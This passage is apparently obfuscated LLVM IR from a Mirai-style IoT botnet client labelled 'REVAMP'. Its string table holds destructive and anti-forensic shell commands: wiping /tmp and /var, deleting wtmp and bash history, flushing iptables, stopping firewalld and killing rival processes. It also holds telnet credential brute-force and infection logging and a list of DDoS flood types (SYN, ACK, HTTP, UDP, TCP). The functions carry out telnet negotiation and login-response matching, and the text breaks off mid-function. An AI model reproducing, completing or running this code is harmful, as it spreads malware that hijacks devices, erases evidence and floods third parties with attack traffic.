@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.473 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@MiraiIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.474 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.475 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.476 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.477 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.478 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.479 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.480 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.481 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.482 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.483 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.484 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.485 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.486 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.487 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.488 = private unnamed_addr constant [72 x i8] c"[ REVAMP ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.489 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.490 = private unnamed_addr constant [91 x i8] c"[ REVAMP ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.491 = private unnamed_addr constant [27 x i8] c"pkill -9 %s;killall -9 %s;\00", align 1
@.str.492 = private unnamed_addr constant [78 x i8] c"[ REVAMP ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.493 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.494 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.495 = private unnamed_addr constant [75 x i8] c"[ REVAMP ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.496 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.497 = private unnamed_addr constant [85 x i8] c"[ REVAMP ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.498 = private unnamed_addr constant [72 x i8] c"[ REVAMP ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.499 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@.str.500 = private unnamed_addr constant [11 x i8] c"d0mQacDMH0\00", align 1
@.str.501 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.502 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.503 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.504 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.505 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.506 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.507 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.508 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.509 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.510 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.511 = private unnamed_addr constant [5 x i8] c"SREP\00", align 1
@.str.512 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.513 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.514 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.515 = private unnamed_addr constant [21 x i8] c"[SREP] FLoad Mode ON\00", align 1
@.str.516 = private unnamed_addr constant [6 x i8] c"MIRAI\00", align 1
@.str.517 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.518 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.519 = private unnamed_addr constant [5 x i8] c"ZUDP\00", align 1
@.str.520 = private unnamed_addr constant [5 x i8] c"ZTCP\00", align 1
@.str.521 = private unnamed_addr constant [5 x i8] c"ZSTD\00", align 1
@.str.522 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.523 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.524 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.525 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.528 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.529 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.530 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.531 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.532 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.526 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.527 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.533 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.534 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.535 = private unnamed_addr constant [35 x i8] c"[ INFECTED ] Arch: %s || Type: %s]\00", align 1
@.str.536 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.537 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 %5, -446413095
  %7 = add i32 %6, -1640531527
  %8 = add i32 %7, -446413095
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, -1640531527
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add i32 %10, -1640531527
  %16 = sub i32 0, %14
  %17 = sub i32 0, -1640531527
  %18 = add i32 %16, %17
  %19 = sub i32 0, %18
  %20 = add i32 %14, -1640531527
  store i32 %19, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %21

; <label>:21:                                     ; preds = %67, %1
  %22 = load i32, i32* %3, align 4
  %23 = icmp slt i32 %22, 4096
  br i1 %23, label %24, label %73

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* %3, align 4
  %26 = add i32 %25, 1544215079
  %27 = sub i32 %26, 3
  %28 = sub i32 %27, 1544215079
  %29 = sub nsw i32 %25, 3
  %30 = sext i32 %28 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = load i32, i32* %3, align 4
  %34 = sub i32 0, 2
  %35 = add i32 %33, %34
  %36 = sub nsw i32 %33, 2
  %37 = sext i32 %35 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %32, -1
  %41 = and i32 %39, %40
  %42 = xor i32 %39, -1
  %43 = and i32 %32, %42
  %44 = or i32 %41, %43
  %45 = xor i32 %32, %39
  %46 = xor i32 %44, -1
  %47 = and i32 1386125031, %46
  %48 = xor i32 1386125031, -1
  %49 = and i32 %44, %48
  %50 = xor i32 -1640531527, -1
  %51 = and i32 %50, 1386125031
  %52 = and i32 -1640531527, %48
  %53 = or i32 %47, %49
  %54 = or i32 %51, %52
  %55 = xor i32 %53, %54
  %56 = xor i32 %44, -1640531527
  %57 = load i32, i32* %3, align 4
  %58 = xor i32 %55, -1
  %59 = and i32 %57, %58
  %60 = xor i32 %57, -1
  %61 = and i32 %55, %60
  %62 = or i32 %59, %61
  %63 = xor i32 %55, %57
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %65
  store i32 %62, i32* %66, align 4
  br label %67

; <label>:67:                                     ; preds = %24
  %68 = load i32, i32* %3, align 4
  %69 = add i32 %68, -954810728
  %70 = add i32 %69, 1
  %71 = sub i32 %70, -954810728
  %72 = add nsw i32 %68, 1
  store i32 %71, i32* %3, align 4
  br label %21

; <label>:73:                                     ; preds = %21
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 %5, 57877792
  %7 = add i32 %6, 1
  %8 = add i32 %7, 57877792
  %9 = add i32 %5, 1
  %10 = xor i32 %8, -1
  %11 = xor i32 4095, -1
  %12 = xor i32 -1220948996, -1
  %13 = or i32 %10, %11
  %14 = or i32 -1220948996, %12
  %15 = xor i32 %13, -1
  %16 = and i32 %15, %14
  %17 = and i32 %8, 4095
  store i32 %16, i32* @rand_cmwc.i, align 4
  %18 = load i64, i64* %2, align 8
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %18, %23
  %25 = load i32, i32* @c, align 4
  %26 = zext i32 %25 to i64
  %27 = add i64 %24, 7015211462114831445
  %28 = add i64 %27, %26
  %29 = sub i64 %28, 7015211462114831445
  %30 = add i64 %24, %26
  store i64 %29, i64* %1, align 8
  %31 = load i64, i64* %1, align 8
  %32 = lshr i64 %31, 32
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @c, align 4
  %34 = load i64, i64* %1, align 8
  %35 = load i32, i32* @c, align 4
  %36 = zext i32 %35 to i64
  %37 = add i64 %34, 5344141004816274160
  %38 = add i64 %37, %36
  %39 = sub i64 %38, 5344141004816274160
  %40 = add i64 %34, %36
  %41 = trunc i64 %39 to i32
  store i32 %41, i32* %3, align 4
  %42 = load i32, i32* %3, align 4
  %43 = load i32, i32* @c, align 4
  %44 = icmp ult i32 %42, %43
  br i1 %44, label %45, label %58

; <label>:45:                                     ; preds = %0
  %46 = load i32, i32* %3, align 4
  %47 = sub i32 0, %46
  %48 = sub i32 0, 1
  %49 = add i32 %47, %48
  %50 = sub i32 0, %49
  %51 = add i32 %46, 1
  store i32 %50, i32* %3, align 4
  %52 = load i32, i32* @c, align 4
  %53 = sub i32 0, %52
  %54 = sub i32 0, 1
  %55 = add i32 %53, %54
  %56 = sub i32 0, %55
  %57 = add i32 %52, 1
  store i32 %56, i32* @c, align 4
  br label %58

; <label>:58:                                     ; preds = %45, %0
  %59 = load i32, i32* %4, align 4
  %60 = load i32, i32* %3, align 4
  %61 = sub i32 0, %60
  %62 = add i32 %59, %61
  %63 = sub i32 %59, %60
  %64 = load i32, i32* @rand_cmwc.i, align 4
  %65 = zext i32 %64 to i64
  %66 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %65
  store i32 %62, i32* %66, align 4
  ret i32 %62
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %19, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = sub i32 %10, -271079383
  %12 = add i32 %11, 1
  %13 = add i32 %12, -271079383
  %14 = add nsw i32 %10, 1
  store i32 %13, i32* %6, align 4
  %15 = sext i32 %13 to i64
  %16 = getelementptr inbounds i8*, i8** %9, i64 %15
  %17 = load i8*, i8** %16, align 8
  %18 = icmp ne i8* %17, null
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %8
  br label %8

; <label>:20:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %21

; <label>:21:                                     ; preds = %36, %20
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %6, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %4, align 8
  %27 = load i8**, i8*** %5, align 8
  %28 = load i32, i32* %7, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8*, i8** %27, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %26, i8* %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %25
  store i32 1, i32* %3, align 4
  br label %43

; <label>:35:                                     ; preds = %25
  br label %36

; <label>:36:                                     ; preds = %35
  %37 = load i32, i32* %7, align 4
  %38 = add i32 %37, 1652614552
  %39 = add i32 %38, 1
  %40 = sub i32 %39, 1652614552
  %41 = add nsw i32 %37, 1
  store i32 %40, i32* %7, align 4
  br label %21

; <label>:42:                                     ; preds = %21
  store i32 0, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %42, %34
  %44 = load i32, i32* %3, align 4
  ret i32 %44
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = xor i64 %37, -1
  %39 = xor i64 %31, -1
  %40 = xor i64 4219240595358698094, -1
  %41 = and i64 %38, 4219240595358698094
  %42 = and i64 %37, %40
  %43 = and i64 %39, 4219240595358698094
  %44 = and i64 %31, %40
  %45 = or i64 %41, %42
  %46 = or i64 %43, %44
  %47 = xor i64 %45, %46
  %48 = or i64 %38, %39
  %49 = xor i64 %48, -1
  %50 = or i64 4219240595358698094, %40
  %51 = and i64 %49, %50
  %52 = or i64 %47, %51
  %53 = or i64 %37, %31
  store i64 %52, i64* %36, align 8
  %54 = load i32, i32* %6, align 4
  %55 = sub i32 0, 1
  %56 = sub i32 %54, %55
  %57 = add nsw i32 %54, 1
  %58 = call i32 @select(i32 %56, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %59 = icmp slt i32 %58, 1
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %68

; <label>:61:                                     ; preds = %27
  %62 = load i32, i32* %6, align 4
  %63 = load i8*, i8** %8, align 8
  %64 = load i32, i32* %9, align 4
  %65 = sext i32 %64 to i64
  %66 = call i64 @recv(i32 %62, i8* %63, i64 %65, i32 0)
  %67 = trunc i64 %66 to i32
  store i32 %67, i32* %5, align 4
  br label %68

; <label>:68:                                     ; preds = %61, %60
  %69 = load i32, i32* %5, align 4
  ret i32 %69
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = add i64 %7, 1168372272283899218
  %9 = sub i64 %8, 1
  %10 = sub i64 %9, 1168372272283899218
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #9
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %4, align 4
  br label %13

; <label>:29:                                     ; preds = %13
  br label %30

; <label>:30:                                     ; preds = %45, %29
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %43

; <label>:34:                                     ; preds = %30
  %35 = load i8*, i8** %2, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = call i32 @isspace(i32 %40) #9
  %42 = icmp ne i32 %41, 0
  br label %43

; <label>:43:                                     ; preds = %34, %30
  %44 = phi i1 [ false, %30 ], [ %42, %34 ]
  br i1 %44, label %45, label %50

